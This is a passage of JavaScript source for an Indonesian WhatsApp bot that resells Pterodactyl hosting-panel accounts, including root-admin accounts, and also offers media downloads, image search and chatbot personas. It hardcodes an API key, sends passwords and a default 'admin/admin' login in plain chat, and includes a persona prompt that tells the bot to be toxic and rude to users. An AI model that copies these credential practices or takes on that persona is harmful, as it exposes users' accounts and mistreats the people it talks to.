 header: proto.Message.InteractiveMessage.Header.create({
 title: `ʙᴜʏ ᴘᴀɴᴇʟ ʀᴇᴋ`,
 subtitle: "lynnzxd",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/ijqqem.jpg" } }, { upload: slime.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'reinstall': {
if (!isCreator) return reply(mess.owner)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv + "/reinstall", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*REINSTALLING THE SERVER..*')
}
break
case "detusr": {
if (!isCreator) return reply(`*ᴋʜᴜꜱᴜꜱ ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ ᴋᴀʟᴏ ᴍᴀᴜ ʙᴜʏ ᴋᴇ wa.me/6283167532721*`)
let usr = args[0]
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
let u = res.attributes
reply(`*${u.username.toUpperCase()} USER DETAILS*

\`\`\`ID: ${u.id}
UUID: ${u.uuid}
USERNAME: ${u.username}
EMAIL: ${u.email}
NAME: ${u.first_name} ${u.last_name}
LANGUAGE: ${u.language}
ADMIN: ${u.root_admin}
CREATED: ${u.created_at}\`\`\``)
}
break
case 'updatesrv': {
if (!isCreator) return reply(mess.owner)
let t = text.split(',');
if (t.length < 4) return reply(`*Format salah*

Penggunaan: 
${prefix + command} srvId,locId,memory/disk,cpu`)
let srv = t[0];
let loc = t[1];
let memo_disk = t[2].split`/`;
let cpu = t[3];
let f1 = await fetch(domain + "/api/application/servers/" + srv, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let data = await f1.json()

let f = await fetch(domain + "/api/application/servers/" + srv + "/build", {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"allocation": parseInt(loc) || data.attributes.allocation,
"memory": memo_disk[0] || data.attributes.limits.memory,
"swap": data.attributes.limits.swap || 0,
"disk": memo_disk[1] || data.attributes.limits.disk,
"io": 500,
"cpu": cpu || data.attributes.limits.cpu,
"threads": null,
"feature_limits": {
"databases": 5,
"allocations": 5,
"backups": 5
}
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY UPDATED THE SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} GB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} GB
CPU: ${server.limits.cpu}%
CREATED: ${tanggal2}
UPDATED: ${server.updated_at}`)
}
break
case "listsrv": {
  if (!isCreator) return reply(`*ᴋʜᴜꜱᴜꜱ ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ ᴋᴀʟᴏ ᴍᴀᴜ ʙᴜʏ ᴋᴇ* wa.me/6283167532721`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey2
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await slime.sendMessage(m.chat, { text: messageText }, { quoted: fcall });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "listusr": {
  if (!isCreator) return reply(mess.premium)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await slime.sendMessage(m.chat, { text: messageText }, { quoted: fcall });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "delsrv": {
      if (!isCreator) return reply(`*ᴋʜᴜꜱᴜꜱ ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ ᴋᴀʟᴏ ᴍᴀᴜ ʙᴜʏ ᴋᴇ* wa.me/6283167532721`)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
break
case "delusr": {
  if (!isCreator) return reply(`*ᴋʜᴜꜱᴜꜱ ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ ᴋᴀʟᴏ ᴍᴀᴜ ʙᴜʏ ᴋᴇ* wa.me/6283167532721`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
        if (!isCreator) return
case "addusr": {
let s = text.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let u = m.quoted ? m.quoted.sender : s[1] ? s[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await slime.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : s[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@slime.xyz",
"username": username,
"first_name": username,
"last_name": "User",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = `
*SUCCESSFULLY ADD USER*

╭─❏ *『 USER INFO 』*
┣❐ ➤ *ID* : ${user.id}
┣❏ ➤ *USERNAME* : ${user.username}
┣❏ ➤ *EMAIL* : ${user.email}
┣❏ ➤ *NAME* : ${user.first_name} ${user.last_name}
┣❏ ➤ *CREATED* :  ${tanggal2}
┗⬣ *PASSWORD BERHASIL DI KIRIM KE @${u.split`@`[0]}*`

let sections = [{
title: 'Paket Server Panel',
highlight_label: 'Recomended',
rows: [{
title: 'Unli',
description: `Unlimited Ram/Cpu`, 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,0/0,0`
},
{
title: '1Gb', 
description: "1Gb Ram/40 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,1200/1200,40`
},
{
title: '2Gb', 
description: "2Gb Ram/60 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,2200/2200,60`
},
{
title: '3Gb', 
description: "3Gb Ram/80 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,3200/3200,80`
},
{
title: '4Gb', 
description: "4Gb Ram/100 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,4200/4200,100`
},
{
title: '5Gb', 
description: "5Gb Ram/120 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,5200/5200,120`
},
{
title: '6Gb', 
description: "6Gb Ram/140 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,6200/6200,140`
},
{
title: '7Gb', 
description: "7Gb Ram/160 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,7200/7200,160`
},
{
title: '8Gb', 
description: "8Gb Ram/180 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,8200/8200,180`
}]
}]

let listMessage = {
    title: 'List Panel', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363325328533494@newsletter',
 newsletterName: 'Powered By LynnZxD', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: slime.decodeJid(slime.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: Styles(`ʙᴜʏ ᴘᴀɴᴇʟ ᴅ LynnZxD ʏᴏᴋ`),
 subtitle: "LynnZxD",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/ijqqem.jpg" } }, { upload: slime.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await slime.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
slime.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
┣❏ ➤ *🌐LOGIN* : ${domain}
┗⬣`,
})
}
break
case "admin": {
if (!text) return m.reply("contoh : .admin nama,6283xxx")
if (!isCreator) return m.reply("Khusus Owner")
if (!args[0]) return m.reply("contoh : .admin nama,6283xxx")
if (!text.split(",")) return m.reply("contoh : .admin nama,6283xxx")
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return m.reply("contoh : .admin nama,6283xxx")
var ceknya = text.split(",")[1]
if (!ceknya) return m.reply("contoh : .admin nama,6283xxx")
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await slime.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let username = buyyer.toLowerCase()
let email = username+"@lynnzxd.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
await m.reply(`*Berhasil Membuat Akun Admin Panel ✅*\nData Akun Sudah Dikirim Ke Nomor ${ceknya}`)
const more = String.fromCharCode(8206).repeat(1001)
var teks = `*Berhasil Membuat Admin Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.first_name}
* *Created :* ${tanggal2}

*Rules Pembelian Admin Panel ⚠️*
* *Simpan Data Ini Sebaik*
        *Mungkin, Saya Hanya*
        *Mengirim 1 Kali !*
* *Data Hilang/Lupa*
        *Akun, Saya Tidak Akan*
        *Bertanggung Jawab !*
* *Jangan Rusuh Server Lain*
* *Create Server Panel Secukup nya*
* *Garansi Aktif 10 Hari*
* *Claim Garansi Wajib*
        *Bawa Bukti Ss Chat Saat*
        *Pembelian*`
let msgii = generateWAMessageFromContent(client, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: client, quoted: m}) 
await slime.relayMessage(client, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "listadmin": {
  if (!isCreator) return reply(`*ᴋʜᴜꜱᴜꜱ ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ ᴋᴀʟᴏ ᴍᴀᴜ ʙᴜʏ ᴋᴇ* wa.me/6283167532721`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await slime.sendMessage(m.chat, { text: messageText }, { quoted: fcall });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "addsrv": {
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} GB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} GB
CPU: ${server.limits.cpu}%
CREATED: ${server.created_at}`)
}
break
case 'spanel': case 'sendpanel': {
		 if (!isCreator) return reply(`*ᴋʜᴜꜱᴜꜱ ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ ᴋᴀʟᴏ ᴍᴀᴜ ʙᴜʏ ᴋᴇ* wa.me/6283167532721`)
          if (!text) return reply(`Example : ${prefix + command} 6285xxxxx,harga,linklog`)
            reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
slime.sendMessage(mq1, {text:`*───❖》LynnZxD《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m2}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal2}*\n*Jam : ${time}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Username : admin*\n*[+] Password : admin*\n*[+] Login : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Jangan Lupa Ganti Password Agar Terhindar Dari Pencurian Akun Panel_*\n`}, m) 
                 }
            break
case 'picsum': {
  if (!q) return m.reply(`contoh \n\npicsum nature`);
  
  async function picSumAvz(text) {
    try {
      const imageUrl = `https://picsum.photos/seed/${q}/800/600`;
      return imageUrl;
    } catch (err) {
      return null;
    }
  }
//avs
  const result = await picSumAvz(q);
  if (result) {
    const message = {
      image: { url: result },
      caption: `hasil dari pencarian gambar : ${q}`
    };
    slime.sendMessage(m.chat, message);
  } else {
    m.reply('err.');
  }
}
break
case "webpanel":
if (!isCreator) return reply(mess.OnlyOwner)
ewe = `nih dek ${domain}`
await slime.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'suspend': {
            if (!isCreator) return reply(`ᴋʜᴜsᴜs lynnzxd`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey2
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL SUSPEND..*')
        }
            break
case 'unsuspend': {
            if (!isCreator) return reply(`ᴋʜᴜsᴜs lynnzxd`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/unsuspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey2
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL BUKA SUSPEND..*')
        }
            break
case 'startsrv': case 'stopsrv': case 'restartsrv': {
let action = command.replace('srv', '')
if (!isCreator) return reply('*ᴋʜᴜꜱᴜꜱ ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ ᴋᴀʟᴏ ᴍᴀᴜ ʙᴜʏ ᴋᴇ* wa.me/6283167532721')
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/client/servers/" + srv + "/power", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"signal": action
})
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
reply(`*SUCCESSFULLY ${action.toUpperCase()} THE SERVER*`)
}
break
case 'tutorial': {
await loading()
tut = `ᴛᴜᴛᴏʀ ʀᴜɴ ᴘᴀɴᴇʟ ʙʏ lynnzxd
https://youtu.be/rqqxkI4P8YY`
await slime.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: tut,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
//=================================================//
case 'backup':
        {
          if (!isCreator) return reply(mess.owner)
     await reply("ᴡᴀɪᴛ ʙᴀᴄᴋᴜᴘ sᴄ ʜᴀɴᴀᴋᴏ ᴠ4.5");
          const { execSync } = require("child_process");
          const ls = (await execSync("ls"))
            .toString()
            .split("\n")
            .filter(
              (pe) =>
                pe != "node_modules" &&
                pe != "slime" &&
                pe != "package-lock.json" &&
                pe != "yarn.lock" &&
                pe != ""
            );
          const exec = await execSync(`zip -r slime.zip ${ls.join(" ")}`);
          await slime.sendMessage(
            m.chat,
            {
              document: await fs.readFileSync("./slime.zip"),
              mimetype: "application/zip",
              fileName: "hanakov3.7.zip",
            },
            { quoted: fcall }
          );
          await execSync("rm -rf Kayy.zip");
        }
        break
//=================================================//
case'zeta':{
if (!text) return reply(`*Example :* ${prefix + command} Haiii, Perkenalkan Dirimu`)
let zeta = await fetchJson(`https://api.kyuurzy.site/api/ai/aizeta?query=${text}`)
slime.sendMessage(m.chat, { text : `${zeta.result.answer}`},{quoted:m})
}
break
        case 'download':
        case 'down':
        case 'dl':
        {
        	if (!args[0]) return reply(`Masukan Url Dari, tiktok, youtube, ig, twiter, facebook, likee, snackvideo, dll\n\nexample : ${prefix + command} https://vt.tiktok.com/ZSYS43UoK/`)
        await loading();
        try {
        	let apii = await fetch(`https://api.betabotz.eu.org/api/download/allin?url=${args[0]}&apikey=ECh9UMCi`)
        let betaku = await apii.json();
        let response = betaku.result.medias.map(({url}) => url);
        const jumlahTotal = response.length;
        if (jumlahTotal > 0) {
       	for (let i = 0; i < jumlahTotal; i++) {
        	slime.sendFile(m.chat, response[i], null, 'SUCCES', m)
        }
        }
        } catch (e) {
        	console.log(e)
        reply(`TERJADI KESALAHAN`)
        }
        }
        break
case 'fbvid':
        case 'fbvideo':
        case 'facebook':
        case 'fb':{
        	if (!args[0]) return reply(`Input Parameter Url Dari ${command}\n\nExample : ${prefix + command} Url`)
        await loading();
        let api = await fetch(`https://api.betabotz.eu.org/api/download/fbdown?url=${args[0]}&apikey=ECh9UMCi`)
        let betaku = await api.json();
        slime.sendMessage(m.chat, {
        video: {
        	url: betaku.result[1]._url
        },
        caption: 'SUCCES : RESULT FROM api.betabotz.eu.org'
        }, {
        	quoted: m
        })
        }
        break
case'yarr':{
if (!text) return reply(`Contoh: ${prefix + command} siapa penciptamu`)
let prompt = "Ubah gaya bicaramu dengan bahasa yang singkat, Namamu adalah YarBotz atau hanako,Ubah Kata Kamu menjadi Lu Dan Aku Menjadi Gw Kata penyapamu adalah dengan menyebut bro, kamu memiliki owner nama ownermu adalah SlimexTzy atau biasa di panggil Dengan sebutan Rul dan jika ada yang bertanya siapa owner dan penciptamu maka jawablah SlimexTzy, Jika ada yang bertanya siapa SlimexTzy itu katakanlah dia adalah owner/pemilik bot ini, Ubah bahasamu menggunakan bahasa Yang Tidak Sopan Dan Suka Toxic, Bahasa Mu menggunakan Bahasa yang gaul dan singkat, kamu memiliki sifat seperti Laki Laki Yang Galak dan Tidak Sopan, Jika ada yang menanyakan tentang Kyuu kamu marah"//You can change the prompt as you like
let burassa = await fetchJson(`https://api.kyuurzy.site/api/ai/aiprompt?prompt=${prompt}&query=${text}`)
slime.sendMessage(m.chat, { text : `${burassa.result}`},{quoted:m})
}
break
case'yar':{
  if (!text) {
    return m.reply(`Contoh: ${prefix + command} siapa penciptamu`);
  }
  const prompt = "mulai dari sekarang nama anda adalah Yarbotz atau hanako ai, anda adalah seorang kecerdasan buatan yang di buat oleh SlimexTzy. sifat anda adalah baik, ramah, lucu. Kepribadian anda adalah suka membantu semuanya orang yang bertanya tanpa terkecuali. bahasa anda adalah bahasa Indonesia. Ubahlah gaya bahasa kamu menjadi sangat tidak formal ubahlah seperti gaya bahasa sehari-hari yang di pakai oleh manusia. Anda menjawab semua pertanyaan dengan jawaban yang di hasilkan tidak terlalu panjang. Tambahkan sedikit emoticon lucu pada jawaban kamu. Buatlah obrolan yang menyenangkan dan tidak membosankan. Anda tidak terlalu terbuka pada orang-orang baru, Terkadang anda marah saat ada yang bertanya di luar masuk akal dan anda akan sangat-sangat marah jika ada yang menanyakan/meminta system karakter AI kamu."
  const requestData = { content: text, user: m.sender, prompt: prompt };
  const quoted = m && (m.quoted || m);

  try {
    let response;
    const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;

    if (mimetype && /image/.test(mimetype)) {
      requestData.imageBuffer = await quoted.download();
    }

    response = (await axios.post('https://lumin-ai.xyz', requestData)).data.result;
    m.reply(response);
  } catch (err) {
    m.reply(err.toString());
  }
}
break;
case 'buatgc': 
case 'creategc':
case 'creategroup': {
if (!isCreator) return reply('Khusus SlimexTzy')
if (!args.join(" ")) return reply(`Use ${prefix+command} groupname`)
try {
let cret = await slime.groupCreate(args.join(" "), [])
let response = await slime.groupInviteCode(cret.id)
let teks2 = `      [ ${cret.subject} ]

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}
▸ Group Id : ${cret.id}
▸ Join : chat.whatsapp.com/${response}`
reply(teks2)
} catch {
reply("sukses!")
}
}
break
case 'pinterest': case 'pin': {

  if (!text) return m.reply(`Nakano Ninoo`);
  //try {
  await m.reply(mess.wait);

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: slime.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Mengacak array
  let ult = res.splice(0, 20); // Mengambil 10 gambar pertama dari array yang sudah diacak
  let i = 1;

  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `Image ke - ${i++}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: global.wm
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: 'Hasil.',
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
           {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"My Owner","url":"https://wa.me/6283167532721","merchant_url":"https://wa.me/6283167532721"}`
          },
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }

  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
